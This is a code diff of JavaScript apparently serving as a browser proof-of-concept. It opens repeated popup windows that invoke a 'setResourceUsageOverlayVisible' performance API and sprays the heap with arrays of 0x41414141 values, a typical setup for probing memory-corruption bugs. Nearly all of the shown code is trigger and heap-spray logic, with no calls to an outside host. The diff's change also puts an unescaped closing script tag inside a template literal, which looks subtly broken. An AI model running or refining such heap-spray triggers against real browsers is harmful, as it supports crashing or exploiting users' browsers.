@@ -5,47 +5,34 @@
         async function trigger() {
             let spray = [];
             console.log("Starting test...");
-
             for (let i = 0; i < 10; i++) {
                 try {
                     let win = window.open("", "_blank");
-
                     if (win) {
-                        win.document.open();
                         win.document.write(`
-                            <html><body>
                             <script>
                                 try {
                                     window.performance = window.performance || {};
                                     performance.setResourceUsageOverlayVisible = performance.setResourceUsageOverlayVisible || function(visible) {
-                                        console.log("Overlay attempt: " + visible);
+                                        console.log("Tried to set overlay visible: " + visible);
                                     };
                                     performance.setResourceUsageOverlayVisible(true);
-                                    setTimeout(() => window.close(), 100);
                                 } catch (e) {
-                                    console.log("Window error:", e);
+                                    console.log("Error in window:", e);
                                 }
-                            <\/script>
-                            </body></html>
+                            </script>
                         `);
                         win.document.close();
-
-                        await new Promise(resolve => setTimeout(resolve, 200));
+                        await new Promise(resolve => setTimeout(resolve, 300));
+                        win.close();
                     }
-
-                    spray.push({
-                        ptr: new Array(64).fill(0x41414141),
-                        data: new Array(64).fill("test")
-                    });
-
+                    spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
                 } catch (e) {
                     console.log("Error:", e);
                 }
-
                 let largeObject = new Array(250000).fill(0);
                 largeObject = null;
             }
-
             spray = null;
             console.log("Test complete");
         }
